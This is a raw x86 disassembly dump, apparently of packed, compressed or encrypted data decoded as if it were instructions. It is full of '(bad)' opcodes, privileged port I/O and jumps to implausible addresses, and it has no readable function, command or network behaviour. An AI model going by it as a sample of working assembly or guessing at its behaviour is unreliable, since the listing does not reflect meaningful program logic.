  406a87:	sub    eax,edx
  406a89:	mov    edx,0x74d136cc
  406a8e:	jne    0x406acb
  406a90:	mov    ds:0x3e685d3,al
  406a95:	out    dx,eax
  406a96:	in     eax,dx
  406a97:	mov    ch,0x34
  406a99:	dec    ebx
  406a9a:	sub    BYTE PTR [edi],0x4
  406a9d:	arpl   WORD PTR [eax],ax
  406a9f:	sub    DWORD PTR [edi+0x64],edx
  406aa2:	sub    al,0xa2
  406aa4:	xor    DWORD PTR [edx],ebx
  406aa6:	(bad)  
  406aa7:	icebp  
  406aa8:	add    ebp,edx
  406aaa:	add    al,BYTE PTR [eax]
  406aac:	push   0x29
  406aae:	add    ebx,ebp
  406ab0:	pop    ss
  406ab1:	fild   WORD PTR ds:0x2c60e900
  406ab7:	pop    ebx
  406ab8:	aas    
  406ab9:	fadd   st,st(6)
  406abb:	or     cl,ch
  406abd:	dec    ebp
  406abe:	sub    ah,0x62
  406ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ac2:	std    
  406ac3:	or     ch,BYTE PTR [ecx+0x18002ac]
  406ac9:	addr16 push edx
  406acb:	or     DWORD PTR [ecx+0x60],esi
  406ace:	add    eax,0xc6a9e900
  406ad3:	add    al,0xe9
  406ad5:	inc    edi
  406ad6:	mov    bh,0xeb
  406ad8:	mul    al
  406ada:	or     al,0x5c
  406adc:	sbb    eax,0xbe38855c
  406ae1:	xor    eax,0x60e8ba04
  406ae6:	add    eax,0x9200
	...
  406af7:	add    BYTE PTR [ebp-0x71],ah
  406afa:	add    cl,ch
  406afc:	pusha  
  406afd:	add    eax,0x5586940
  406b02:	jne    0x406b51
  406b04:	daa    
  406b05:	(bad)  
  406b06:	leave  
  406b07:	sub    esp,DWORD PTR [ebp+eax*1+0x55]
  406b0b:	bound  esi,QWORD PTR [ebx+esi*1+0x420fba56]
  406b12:	or     al,0xec
  406b14:	pusha  
  406b15:	add    DWORD PTR [eax],eax
  406b17:	jmp    0x41914fcd
  406b1c:	scas   al,BYTE PTR es:[edi]
  406b1d:	sar    bh,1
  406b1f:	cs out dx,eax
  406b21:	int3   
  406b22:	mov    eax,DWORD PTR [ecx-0x19]
  406b25:	push   ecx
  406b26:	or     BYTE PTR [edx-0x63],dh
  406b29:	stc    
  406b2a:	jmp    0xb420:0xb3cfceb
  406b31:	add    BYTE PTR [eax+0x74c91c00],al
  406b37:	cmc    
  406b38:	xor    DWORD PTR [eax+0xfa60274],edx
  406b3e:	sub    eax,eax
  406b40:	mov    al,ds:0x1475c983
  406b45:	dec    edi
  406b46:	ret    
  406b47:	pop    ebx
  406b48:	pop    esp
  406b49:	sbb    cl,cl
  406b4b:	ret    0x702
  406b4e:	push   ebx
  406b4f:	push   esi
  406b50:	repz std 
  406b52:	(bad)  
  406b53:	(bad)  
  406b54:	cli    
  406b55:	push   esi
  406b56:	xor    edx,edx
  406b58:	call   0x0:0x90daf6
	...
  406b6b:	ficom  WORD PTR [ecx+0xf]
  406b6e:	mov    dh,0xba
  406b70:	push   ecx
  406b71:	cmp    al,0x2b
  406b73:	push   0x2c
  406b75:	push   es
  406b76:	nop
  406b77:	dec    ecx
  406b78:	(bad)  
  406b79:	ds nop
  406b7b:	mov    ebp,esi
  406b7d:	cs nop
  406b7f:	ja     0x406b84
  406b81:	nop
  406b82:	cmp    eax,0xfffffffa
  406b85:	pop    DWORD PTR [ebx-0x2]
  406b88:	test   BYTE PTR [edi+0x38fac07c],0x90
  406b8f:	mov    ebp,0xb90403fd
  406b94:	xchg   esi,eax
  406b95:	inc    ebx
  406b96:	cmp    al,0xcb
  406b98:	push   esi
  406b99:	jl     0x406ba6
  406b9b:	outs   dx,BYTE PTR ds:[esi]
  406b9c:	pop    ds
  406b9d:	nop
  406b9e:	jg     0x406b24
  406ba0:	jmp    0x3c43:0x96799040
  406ba7:	stos   DWORD PTR es:[edi],eax
  406ba8:	push   esi
  406ba9:	jl     0x406bb5
  406bab:	outs   dx,BYTE PTR ds:[esi]
  406bac:	cmp    al,0x90
  406bae:	jg     0x406b37
  406bb0:	jmp    0xc2c1:0x462a0346
  406bb7:	inc    esp
  406bb8:	in     al,0xb1
  406bba:	shl    DWORD PTR [ebx+0x26],0x6
  406bbe:	mov    esp,DWORD PTR [ecx]
  406bc0:	stos   DWORD PTR es:[edi],eax
  406bc1:	mov    ebx,0x3ad43bc1
  406bc6:	nop
  406bc7:	call   0x989edfe2
  406bcc:	pop    ds
  406bcd:	cmp    DWORD PTR [ebx+0x0],ecx
	...
  406bdb:	add    BYTE PTR [eax],al
  406bdd:	add    BYTE PTR [edi],bh
  406bdf:	outs   dx,DWORD PTR ds:[esi]
  406be0:	ss push esi
  406be2:	daa    
  406be3:	push   edi
  406be4:	pop    eax
  406be5:	or     bl,dh
  406be7:	push   esi
  406be8:	push   eax
  406be9:	adc    bl,dh
  406beb:	inc    ax
  406bed:	or     al,0xf3
  406bef:	out    dx,al
  406bf0:	stos   BYTE PTR es:[edi],al
  406bf1:	jecxz  0x406c34
  406bf3:	sub    al,0x34
  406bf5:	nop
  406bf6:	or     ecx,DWORD PTR [esi]
  406bf8:	iret   
  406bf9:	push   esp
  406bfb:	sub    ecx,DWORD PTR [eax-0x661b9237]
  406c01:	sar    ebx,0xd3
  406c04:	jae    0x406c49
  406c06:	shl    DWORD PTR [ebx+0x5ef35973],0xc5
  406c0d:	add    al,0xf3
  406c0f:	pop    esi
  406c10:	fadd   QWORD PTR [ebx+esi*8]
  406c13:	add    ch,BYTE PTR [esi+0x739ee890]
  406c19:	pop    esi
  406c1a:	adc    al,0xf7
  406c1c:	mov    esp,0x38dc5fc2
  406c21:	mov    esi,DWORD PTR [edi-0x621338a4]
  406c27:	sub    cl,dh
  406c29:	push   ebx
  406c2a:	dec    eax
  406c2b:	pop    ss
  406c2c:	add    BYTE PTR [ebp-0x71],0x8b
  406c30:	pop    ebx
  406c31:	adc    bh,BYTE PTR [edx]
  406c33:	popf   
  406c34:	add    edi,edi
  406c36:	add    ebx,DWORD PTR ss:0x26446341
  406c3d:	(bad)  
  406c3e:	arpl   sp,bx
  406c40:	cli    
  406c41:	mov    edi,0x0
	...
  406c4e:	add    BYTE PTR [eax],al
  406c50:	add    dh,ch
  406c52:	add    al,0xcb
  406c54:	into   
  406c55:	(bad)  
  406c56:	cmc    
  406c57:	sbb    eax,0xea5b6758
  406c5c:	pop    ecx
  406c5d:	arpl   ax,cx
  406c5f:	xchg   esp,eax
  406c60:	sti    
  406c61:	inc    ebp
  406c62:	push   ebx
  406c63:	add    eax,0xe9bf57db
  406c68:	add    ebp,DWORD PTR [eax-0x3b]
  406c6b:	jl     0x406c71
  406c6d:	mov    al,ds:0x3bcf74c8
  406c72:	fldcw  WORD PTR [esp+eax*1-0x23e039d]
  406c79:	ffreep st(2)
  406c7b:	jmp    0x64bacf83
  406c80:	rol    DWORD PTR ds:0x8b34c6c9,1
  406c86:	add    eax,ebp
  406c88:	add    esp,DWORD PTR [ebx-0x23]
  406c8b:	xchg   ebx,eax
  406c8c:	enter  0x563,0xe2
  406c90:	ret    
  406c91:	push   esp
  406c92:	adc    DWORD PTR [ebp+0x4],0x7dc0563
  406c99:	bound  eax,QWORD PTR ds:0xa6e5fce9
  406c9f:	jmp    0xe99bcfa7
  406ca4:	jle    0x406c8c
  406ca6:	aam    0x7f
  406ca8:	int    0xb4
  406caa:	xor    eax,0x5a78d81
  406caf:	jmp    0x68154b32
  406cb4:	int    0x0
	...
  406cc2:	add    BYTE PTR [eax],al
  406cc4:	pushf  
  406cc5:	xor    eax,0xc8954451
  406cca:	push   esi
  406ccb:	stc    
  406ccc:	int3   
  406ccd:	push   edx
  406cce:	in     eax,dx
  406ccf:	pop    ebx
  406cd0:	jmp    0x406cef
  406cd2:	test   al,0x3
  406cd4:	out    dx,al
  406cd5:	cmp    BYTE PTR [edx],0xce
  406cd8:	je     0x406ca2
  406cda:	add    BYTE PTR [ecx+0x2ef6ae88],bl
  406ce0:	xchg   esi,eax
  406ce1:	enter  0xf175,0x90
  406ce5:	frstor [esi+edx*1]
  406ce8:	es enter 0xe6eb,0x1f
  406ced:	push   edx
  406cee:	or     BYTE PTR [esp+ebx*8-0x2d],bl
  406cf2:	inc    BYTE PTR [esi]
  406cf4:	cs xor eax,0xc80d3ee8
  406cfa:	jmp    DWORD PTR [eax-0x1c]
  406cfd:	fdivr  st,st(6)
  406cff:	out    dx,al
  406d00:	pop    ss
  406d01:	pop    ebx
  406d02:	add    BYTE PTR [ebx+0x67],dl
  406d05:	pop    ebx
  406d06:	add    dl,BYTE PTR [ebx+0x5f]
  406d09:	pop    ebx
  406d0a:	add    eax,DWORD PTR [ecx+0x67]
  406d0d:	add    eax,0x9217a900
  406d12:	in     al,dx
  406d13:	(bad)  
  406d14:	das    
  406d15:	enter  0xcde8,0x23
  406d19:	add    eax,0xcda56000
  406d1e:	inc    eax
  406d1f:	xor    eax,0xf975c6f7
  406d24:	scas   eax,DWORD PTR es:[edi]
  406d25:	push   ecx
  406d26:	or     al,0x9e
	...
  406d34:	add    BYTE PTR [eax],al
  406d36:	add    BYTE PTR ds:0xaec7e8cd,ch
  406d3c:	(bad)  
  406d3d:	jmp    DWORD PTR [edx-0x8]
  406d40:	(bad)  
  406d41:	jne    0x406cc4
  406d43:	cwde   
  406d44:	stos   BYTE PTR es:[edi],al
  406d45:	ret    
  406d46:	jmp    0xfd1b69ab
  406d4b:	stos   DWORD PTR es:[edi],eax
  406d4c:	(bad)  
  406d4d:	mov    ch,0x7d
  406d4f:	xchg   esi,eax
  406d50:	(bad)  
  406d51:	call   DWORD PTR [ecx+0x6d]
  406d54:	rol    DWORD PTR [eax],0xe9
  406d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d58:	xchg   ecx,eax
  406d59:	in     al,dx
  406d5a:	push   edi
  406d5b:	lahf   
  406d5c:	(bad)  
  406d5d:	call   0x81f83
  406d62:	add    cl,dh
  406d64:	les    ebx,FWORD PTR [ebx-0x37]
  406d67:	dec    eax
  406d68:	enter  0x54ff,0x1
  406d6c:	test   al,0x81
  406d6e:	les    esp,FWORD PTR [esi]
  406d70:	mov    edx,0xba19ffff
  406d75:	jne    0x406d83
  406d77:	jne    0x406da8
  406d79:	or     BYTE PTR [eax+0x48],ch
  406d7c:	in     al,dx
  406d7d:	inc    eax
  406d7e:	add    BYTE PTR [ebp-0x11],dl
  406d81:	sub    DWORD PTR es:[ebx],ecx
  406d84:	add    ebp,eax
  406d86:	mov    ecx,0xbffbb2f
  406d8b:	jp     0x406d56
  406d8d:	test   dl,bl
  406d8f:	cmp    al,BYTE PTR [ebx]
  406d91:	add    BYTE PTR [ebx],ch
  406d93:	and    DWORD PTR [ebp-0x7b],ecx
  406d96:	out    dx,eax
  406d97:	xor    al,0xbb
  406d99:	call   DWORD PTR [eax+0x0]
	...
  406da8:	add    BYTE PTR [eax],al
  406daa:	mov    ds:0xfa000105,al
  406daf:	stos   BYTE PTR es:[edi],al
  406db0:	in     al,0xc3
  406db2:	or     al,BYTE PTR [ebx]
  406db4:	or     eax,eax
  406db6:	add    eax,0xfa00bd47
  406dbb:	add    bh,BYTE PTR ds:0x2fb04
  406dc1:	cmovge ebp,DWORD PTR [edi+0x0]
  406dc5:	add    dl,cl
  406dc7:	dec    ebp
  406dc8:	inc    ebp
  406dc9:	cld    
  406dca:	mov    ch,BYTE PTR [ecx-0x452a1646]
  406dd0:	lea    eax,[ebp-0x442b]
  406dd6:	pop    edx
  406dd7:	test   eax,0xba35fd4f
  406ddc:	or     eax,eax
  406dde:	scas   eax,DWORD PTR es:[edi]
  406ddf:	fisub  WORD PTR [edi-0x68]
  406de2:	jb     0x406e24
  406de4:	add    BYTE PTR [ebp-0x15601],cl
  406dea:	arpl   WORD PTR [edi],bp
  406dec:	xor    al,0xe8
  406dee:	jnp    0x406e21
  406df0:	retf   
  406df1:	(bad)  
  406df2:	jl     0x406d7d
  406df4:	sti    
  406df5:	dec    edi
  406df6:	mov    ecx,ebx
  406df8:	sar    edi,1
  406dfa:	ins    BYTE PTR es:[edi],dx
  406dfb:	inc    ebx
  406dfc:	sti    
  406dfd:	(bad)  
  406dfe:	out    dx,al
  406dff:	jecxz  0x406e79
  406e01:	test   DWORD PTR [esi+ebx*1-0x35],ecx
  406e05:	push   DWORD PTR [ebx+0x4cf5b9f4]
  406e0b:	out    dx,eax
  406e0c:	xor    edi,edi
	...
  406e1a:	add    BYTE PTR [eax],al
  406e1c:	add    dh,cl
  406e1e:	clc    
  406e1f:	xor    ebp,eax
  406e21:	(bad)
  406e24:	jmp    FWORD PTR [eax+0x1c]
  406e27:	push   eax
  406e28:	push   ebx
  406e29:	sub    al,0x49
  406e2b:	(bad)  
  406e2c:	call   0xb7335
  406e31:	jmp    0x3e4:0x9683cc18
  406e38:	je     0x406ddb
  406e3a:	popa   
  406e3b:	inc    eax
  406e3c:	hlt    
  406e3d:	mov    bl,0xb7
  406e3f:	push   eax
  406e40:	cld    
  406e41:	or     ebp,esi
  406e43:	mov    edi,0xc3616300
  406e48:	js     0x406e7b
  406e4a:	(bad)  
  406e4b:	push   eax
  406e4c:	hlt    
  406e4d:	sti    
  406e4e:	fld    st(6)
  406e50:	add    BYTE PTR [ebx-0x2d],ah
  406e53:	ret    
  406e54:	je     0x406ed3
  406e56:	or     al,0xcb
  406e58:	jne    0x406e25
  406e5a:	add    DWORD PTR ds:0x7e76c4f2,0xffffffd8
  406e61:	sbb    edi,DWORD PTR [edi+0x50]
  406e64:	clc    
  406e65:	adc    ah,ch
  406e67:	fld    TBYTE PTR [ecx+esi*4]
  406e6a:	dec    esi
  406e6b:	retf   0x2eff
  406e6e:	push   eax
  406e6f:	(bad)  
  406e71:	mov    eax,ds:0xe803e904
  406e76:	aas    
  406e77:	in     eax,dx
  406e78:	retf   0xcd16
  406e7b:	add    di,WORD PTR [ebx-0x45]
  406e7f:	pop    eax
  406e80:	retf   0x0
	...
  406e8f:	add    BYTE PTR [ebp+eax*8-0x44],bh
  406e93:	(bad)  
  406e94:	mov    edx,DWORD PTR [esi]
  406e96:	push   eax
  406e97:	retf   0x796c
  406e9a:	sub    ch,BYTE PTR [esi]
  406e9c:	call   0x1590:0xb603e1c2
  406ea3:	xor    ch,al
  406ea5:	inc    edx
  406ea6:	icebp  
  406ea7:	fidiv  WORD PTR [edx+0x5c]
  406eaa:	add    al,BYTE PTR [ecx]
  406eac:	(bad)  [eax+ebp*8+0x7b]
  406eb0:	fs dec esp
  406eb2:	imul   ecx,DWORD PTR [edx],0x29f43a63
  406eb8:	pushf  
  406eb9:	dec    esp
  406eba:	imul   ecx,DWORD PTR [edx],0x83033983
  406ec0:	pop    esp
  406ec1:	adc    bl,BYTE PTR [ebp-0x21]
  406ec4:	jecxz  0x406eca
  406ec6:	repz dec edi
  406ec8:	add    eax,DWORD PTR [esi-0x1f6f04ea]
  406ece:	bound  eax,QWORD PTR [edi+0x6b]
  406ed1:	les    edi,FWORD PTR [esp+edi*8]
  406ed4:	cld    
  406ed5:	mov    ch,BYTE PTR [ebx-0x4e779cfc]
  406edb:	add    al,0x6d
  406edd:	in     al,dx
  406ede:	push   0xc9c49b48
  406ee3:	dec    edi
  406ee4:	outs   dx,BYTE PTR ds:[esi]
  406ee5:	test   DWORD PTR ds:0x1d12cc0c,ebx
  406eeb:	cli    
  406eec:	inc    esp
  406eed:	inc    ecx
  406eee:	ror    eax,1
  406ef0:	imul   edi,DWORD PTR [ecx],0x83ee
	...
  406f02:	add    BYTE PTR [edi],dh
  406f04:	std    
  406f05:	jge    0x406f02
  406f07:	aaa    
  406f08:	or     al,0x0
  406f0a:	scas   eax,DWORD PTR es:[edi]
  406f0b:	and    edi,ebp
  406f0d:	(bad)  
  406f0e:	jmp    0xec2b76d2
  406f13:	mov    bh,0xd1
  406f15:	pop    edi
  406f16:	xor    BYTE PTR [ebp+0x7bc0009],ah
  406f1c:	mov    cl,0x83
  406f1e:	and    eax,0x4835883
  406f23:	mov    ah,0xf3
  406f25:	inc    eax
  406f26:	jmp    0x6a52a88b
  406f2b:	pop    esp
  406f2c:	into   
  406f2d:	cs test al,0x60
  406f30:	add    eax,0x1dff074
  406f35:	mov    cl,0xcf
  406f37:	mov    eax,ds:0x639c0005
  406f3c:	lock mov edi,0x8c6f9b2
  406f42:	jmp    0xa5084f9e
  406f47:	sbb    al,0x5
  406f49:	add    cl,ch
  406f4b:	pusha  
  406f4c:	xchg   edx,eax
  406f4d:	inc    ebp
  406f4e:	icebp  
  406f4f:	push   eax
  406f50:	les    esi,FWORD PTR [ebp-0xf]
  406f53:	mov    dh,0x5
  406f55:	push   esp
  406f57:	int    0xf2
  406f59:	inc    eax
  406f5a:	jmp    0x32b4f366
  406f5f:	pop    ds
  406f60:	cmp    eax,edx
  406f62:	jmp    0x6d10ffc7
	...
  406f73:	add    BYTE PTR [eax],al
  406f75:	add    BYTE PTR ds:0x3f4350b9,ch
  406f7b:	push   edi
  406f7c:	call   esp
  406f7e:	icebp  
  406f7f:	repnz inc eax
  406f81:	jmp    0xd0b4f35d
  406f86:	mov    ds:0x60e8e449,eax
  406f8b:	add    eax,0xbd2d8e00
  406f90:	pop    DWORD PTR [eax]
  406f92:	xchg   ecx,esp
  406f94:	push   DWORD PTR [ebp+0x2e]
  406f97:	cmp    eax,0x4b39ec45
  406f9c:	or     al,0x0
  406f9e:	xchg   esi,eax
  406f9f:	mov    esi,0xa3a45c6
  406fa4:	add    BYTE PTR [eax],al
  406fa6:	jp     0x406f88
  406fa8:	pop    es
  406fa9:	(bad)  
  406faa:	mov    bh,0xd7
  406fac:	add    BYTE PTR [eax],al
  406fae:	mov    al,BYTE PTR [edi]
  406fb0:	push   0x0
  406fb2:	nop
  406fb3:	pop    es
  406fb4:	push   0x10
  406fb6:	inc    DWORD PTR [edx]
  406fb8:	in     al,0x50
  406fba:	mov    al,ds:0x9675ff07
  406fbf:	int    0x15
  406fc1:	leave  
  406fc2:	sub    al,0x48
  406fc4:	add    BYTE PTR [ebx],cl
  406fc6:	jp     0x40701a
  406fc8:	add    DWORD PTR [ebx-0x47],eax
  406fcb:	dec    ebx
  406fcc:	hlt    
  406fcd:	add    dh,dl
  406fcf:	mov    esi,0xe03675fe
  406fd4:	call   0xc3:0x8b073ac1
	...
  406fe7:	add    BYTE PTR [eax],al
  406fe9:	sar    DWORD PTR [edi-0x3e],1
  406fec:	or     BYTE PTR [edx],cl
  406fee:	hlt    
  406fef:	mov    ch,ah
  406ff1:	std    
  406ff2:	push   esp
  406ff3:	or     al,ch
  406ff5:	xchg   esi,eax
  406ff6:	enter  0x0,0x3a
  406ffa:	stc    
  406ffb:	out    0xa0,eax
  406ffd:	sbb    cl,bl
  406fff:	call   DWORD PTR [eax+0x1d]
  407002:	push   ebp
  407003:	or     BYTE PTR [eax+0x12],dl
  407006:	imul   eax,ecx,0xc8eefa00
  40700c:	ret    0x6c6
  40700f:	push   ebp
  407010:	mov    ebp,esi
  407012:	xchg   ah,al
  407014:	cld    
  407015:	mov    DWORD PTR [esi-0x539cf783],eax
  40701b:	push   eax
  40701c:	pop    es
  40701d:	mov    BYTE PTR [ebx+ebp*1-0x37],ch
  407021:	mov    eax,ds:0x882b03b0
  407026:	push   ss
  407027:	add    al,0x6a
  407029:	arpl   WORD PTR [esi],ax
  40702b:	add    al,0x6a
  40702d:	arpl   WORD PTR [esi],ax
  40702f:	(bad)  
  407030:	dec    DWORD PTR [esi]
  407032:	mov    ah,0x59
  407034:	add    cl,bh
  407036:	stos   DWORD PTR es:[edi],eax
  407037:	fcmovnb st,st(4)
  407039:	mov    ds:0xa30b03ac,al
  40703e:	fcom   DWORD PTR [edx]
  407040:	mov    DWORD PTR [esi],ebx
  407042:	dec    eax
  407043:	(bad)  
  407044:	jne    0x4070b5
  407046:	push   esp
  407047:	cs lock fs sti 
  40704b:	cli    
  40704c:	mov    edi,0x0
	...
  407059:	add    BYTE PTR [eax],al
  40705b:	add    bh,dl
  40705d:	or     BYTE PTR [ebx-0x28],bh
  407060:	leave  
  407061:	lods   al,BYTE PTR ds:[esi]
  407062:	pop    ecx
  407063:	add    BYTE PTR [ecx+ebx*4-0x39],cl
  407067:	push   ebx
  407068:	mov    ecx,0x6b75c71b
  40706d:	xchg   BYTE PTR [ebx],al
  40706f:	push   0x63
  407071:	adc    al,0x6d
  407073:	shl    DWORD PTR [ebx-0x54],0xfa
  407077:	mov    edi,0xe832a4ae
  40707c:	jp     0x40703a
  40707e:	(bad)  
  40707f:	dec    DWORD PTR [eax-0x39]
  407082:	jp     0x407047
  407084:	test   al,0x75
  407086:	rol    DWORD PTR [ebx+eiz*2],0x1
  40708a:	jnp    0x407078
  40708c:	loopne 0x4070f5
  40708e:	xlat   BYTE PTR ds:[ebx]
  40708f:	push   eax
  407090:	nop
  407091:	sbb    eax,0x37955732
  407096:	inc    eax
  407097:	or     al,0xd6
  407099:	and    eax,DWORD PTR [ebx+0x78ac6300]
  40709f:	adc    al,0x9e
  4070a1:	add    al,0xe9
  4070a3:	add    esp,DWORD PTR [ebx+0x5]
  4070a6:	jb     0x407053
  4070a8:	fmul   st,st(4)
  4070aa:	test   al,0xdb
  4070ac:	mov    WORD PTR gs:[eax+ebx*8],fs
  4070b0:	call   0xaa4361f4
  4070b5:	retf   0x83e6
  4070b8:	loopne 0x40705f
  4070ba:	mov    dh,0x1a
  4070bc:	cwde   
  4070bd:	test   DWORD PTR [edx+0xb],esi
	...
  4070cc:	add    BYTE PTR [eax],al
  4070ce:	add    BYTE PTR [ecx],dl
  4070d0:	adc    ebp,edx
  4070d2:	retf   0x44cb
  4070d5:	jmp    0x2a2ed3dd
  4070da:	add    bh,BYTE PTR [ebx-0x3f]
  4070dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070de:	xlat   BYTE PTR ds:[ebx]
  4070df:	jmp    0x26b4:0xf6790159
  4070e6:	std    
  4070e7:	arpl   si,sp
  4070e9:	stos   DWORD PTR es:[edi],eax
  4070ea:	pop    esi
  4070eb:	and    al,0x48
  4070ed:	in     eax,0x7c
  4070ef:	or     bl,dl
  4070f1:	push   ss
  4070f2:	mov    esi,0xa71f0da5
  4070f7:	or     DWORD PTR [esi+0x376f3d2e],ebx
  4070fd:	mov    ch,0x11
  4070ff:	push   ebx
  407100:	sar    BYTE PTR [edi+edx*8+0x2c],0x3b
  407105:	icebp  
  407106:	js     0x4070a6
  407108:	mov    ch,0x99
  40710a:	(bad)  [esi+0x5]
  40710d:	jmp    0xedbf8815
  407112:	add    esp,DWORD PTR [ebx+0x5]
  407115:	jb     0x40715e
  407117:	jae    0x4070cd
  407119:	mov    WORD PTR [esi],fs
  40711b:	pushf  
  40711c:	pop    ebx
  40711d:	xor    BYTE PTR [ecx],ch
  40711f:	fwait
  407120:	into   
  407121:	stos   DWORD PTR es:[edi],eax
  407122:	clc    
  407123:	in     al,dx
  407124:	pop    ecx
  407125:	jb     0x4070ff
  407127:	loopne 0x4070f2
  407129:	add    BYTE PTR [ebp+0x1a50588d],dh
  40712f:	nop
  407130:	push   ebx
  407131:	mov    ebx,DWORD PTR [eax+eax*1]
	...
  407140:	add    BYTE PTR [eax],al
  407142:	retf   
  407143:	mov    edi,DWORD PTR [ebp-0xf]
  407146:	dec    ebx
  407147:	dec    edx
  407148:	adc    BYTE PTR [eax+0x7c],ah
  40714b:	ror    DWORD PTR [ebx+0x4603be6],0x72
  407152:	jbe    0x407161
  407154:	mov    edx,DWORD PTR [esi]
  407156:	stos   DWORD PTR es:[edi],eax
  407157:	mov    edi,ecx
  407159:	mov    edx,0xbafae4aa
  40715e:	stos   BYTE PTR es:[edi],al
  40715f:	xchg   edx,eax
  407160:	test   dh,ch
  407162:	sbb    BYTE PTR [ecx+0x6a],ch
  407165:	bound  eax,QWORD PTR ss:[edi]
  407168:	shr    DWORD PTR [ecx],0x7e
  40716b:	add    eax,ebx
  40716d:	bound  ebp,QWORD PTR [edx-0x60f5070c]
  407173:	hlt    
  407174:	clc    
  407175:	ins    BYTE PTR es:[edi],dx
  407176:	repz pop ss
  407178:	push   esi
  407179:	jle    0x407199
  40717b:	lods   eax,DWORD PTR ds:[esi]
  40717c:	add    edx,DWORD PTR [edi-0xa3d3aac]
  407182:	arpl   bp,dx
  407184:	mov    esp,DWORD PTR [ecx]
  407186:	jb     0x407144
  407188:	and    edx,DWORD PTR [ebx]
  40718a:	push   edx
  40718b:	mov    esp,0xdb2e5d8d
  407190:	jo     0x40715b
  407192:	dec    esp
  407193:	add    al,0x4e
  407195:	icebp  
  407196:	and    esi,eax
  407198:	adc    edx,ebp
  40719a:	fimul  DWORD PTR [ebx-0x1bd74506]
  4071a0:	clc    
  4071a1:	sbb    bl,BYTE PTR [edi]
  4071a3:	xchg   edx,eax
  4071a4:	pushf  
  4071a5:	inc    BYTE PTR [eax]
	...
  4071b3:	add    BYTE PTR [eax],al
  4071b5:	cs iret 
  4071b7:	mov    ebp,0xc5f63a8
  4071bc:	test   al,0x23
  4071be:	pop    ss
  4071bf:	add    eax,DWORD PTR [eax]
  4071c1:	ret    
  4071c2:	cmp    al,0xf9
  4071c4:	xor    esp,DWORD PTR [eax]
  4071c6:	in     eax,0xfa
  4071c8:	xor    edx,DWORD PTR [eax]
  4071ca:	aaa    
  4071cb:	test   BYTE PTR [edi],al
  4071cd:	push   ebp
  4071ce:	mov    ecx,0x1b9f57b
  4071d3:	adc    cl,al
  4071d5:	cli    
  4071d6:	rol    BYTE PTR [edx],0xc3
  4071d9:	inc    ecx
  4071da:	int    0x33
  4071dc:	stc    
  4071dd:	test   eax,0x37f933cb
  4071e2:	xor    BYTE PTR [edi],dl
  4071e4:	sub    bh,ah
  4071e6:	inc    eax
  4071e7:	inc    edi
  4071e8:	add    edi,DWORD PTR [ebp+esi*4-0x40]
  4071ec:	ret    0x4b6
  4071ef:	ror    BYTE PTR [ebx+0x23fb1502],1
  4071f5:	add    BYTE PTR ds:0xb9068dfb,dl
  4071fb:	adc    al,BYTE PTR [esi+0x5a]
  4071fe:	mov    eax,ds:0xc2824e03
  407203:	rcl    DWORD PTR [ecx],0x79
  407206:	jge    0x407193
  407208:	cli    
  407209:	pop    ecx
  40720a:	retf   
  40720b:	and    edi,ecx
  40720d:	pop    ecx
  40720e:	retf   
  40720f:	lea    ebx,[ebp+eiz*2+0x67469502]
  407216:	add    eax,0x1c5e
	...
  407227:	add    BYTE PTR [ebx+0x730316c5],cl
  40722d:	cmp    eax,0xe56033f9
  407232:	cli    
  407233:	xor    esp,DWORD PTR [eax+0x37]
  407236:	test   BYTE PTR [edi],al
  407238:	jb     0x407264
  40723a:	sub    BYTE PTR [ecx+0x9],0x1
  40723e:	and    cl,al
  407240:	mov    edx,0x91c3030a
  407245:	jle    0x40727a
  407247:	stc    
  407248:	arpl   WORD PTR [ebx],cx
  40724a:	mov    esp,0x9861fa33
  40724f:	pop    ss
  407250:	mov    esp,0x608b487f
  407255:	push   ss
  407256:	call   0x6e9141b
  40725b:	shr    al,1
  40725d:	je     0x407256
  40725f:	cli    
  407260:	and    BYTE PTR [edx-0x9],0xfa
  407264:	(bad)  
  407265:	xor    BYTE PTR [ebx],dl
  407267:	mov    cl,0x18
  407269:	xchg   edi,eax
  40726a:	ret    
  40726b:	add    esp,DWORD PTR ds:0x52c1c4c4
  407271:	stos   DWORD PTR es:[edi],eax
  407272:	int    0x8b
  407274:	test   eax,0x9a23bb7b
  407279:	jnp    0x407236
  40727b:	(bad)  
  40727c:	test   edi,0x352fd781
  407282:	pop    es
  407283:	pop    esi
  407284:	aaa    
  407285:	in     eax,dx
  407286:	(bad)  
  407287:	push   ss
  407288:	pusha  
  407289:	cmc    
  40728a:	mov    ?,ecx
	...
  407298:	add    BYTE PTR [eax],al
  40729a:	add    BYTE PTR [eax],dh
  40729c:	push   edx
  40729d:	out    0xfa,eax
  40729f:	xor    BYTE PTR [edx-0x6f],al
  4072a2:	test   BYTE PTR [edx+ecx*1+0x15],bl
  4072a6:	nop
  4072a7:	enter  0x49ab,0x30
  4072ab:	and    ch,ah
  4072ad:	or     al,BYTE PTR [ebx]
  4072af:	and    BYTE PTR [ebx],dh
  4072b1:	mov    edi,0xbbcb4a33
  4072b6:	xor    edi,DWORD PTR [edx]
  4072b8:	sub    DWORD PTR [eax-0x64632fe9],ebx
  4072be:	std    
  4072bf:	pusha  
  4072c0:	sahf   
  4072c1:	test   eax,0xd006b021
  4072c7:	call   0x413b697f
  4072cc:	mov    dl,0xf6
  4072ce:	cli    
  4072cf:	fiadd  WORD PTR [esi*2+0x6041d512]
  4072d6:	push   0x60
  4072d8:	dec    edi
  4072d9:	adc    ebp,eax
  4072db:	and    dl,BYTE PTR [edx+ebp*8]
  4072de:	int    0xd8
  4072e0:	mov    edx,0xbc40bbfa
  4072e5:	cli    
  4072e6:	mov    ebx,0xe4d6a0ee
  4072eb:	pop    esp
  4072ec:	jns    0x40730e
  4072ee:	pop    es
  4072ef:	sub    eax,0x6dc6a801
  4072f4:	add    al,al
  4072f6:	mov    ?,WORD PTR [edx-0x45196e0f]
  4072fc:	icebp  
  4072fd:	(bad)  
  4072fe:	nop
	...
  40730b:	add    BYTE PTR [eax],al
  40730d:	add    bh,ah
  40730f:	add    eax,0xb746e90b
  407314:	jmp    0x6008:0xa9c46749
  40731b:	ret    0xbe62
  40731e:	push   eax
  40731f:	mov    ebp,0xba50bd0a
  407324:	ins    BYTE PTR es:[edi],dx
  407325:	xchg   edi,eax
  407326:	push   esp
  407327:	inc    ebp
  407328:	call   0xa21b:0xb701a343
  40732f:	ret    0x6f0
  407332:	xchg   ebx,eax
  407333:	mov    DWORD PTR [ecx-0xa],eax
  407336:	pop    edx
  407337:	jmp    0x8b8d696d
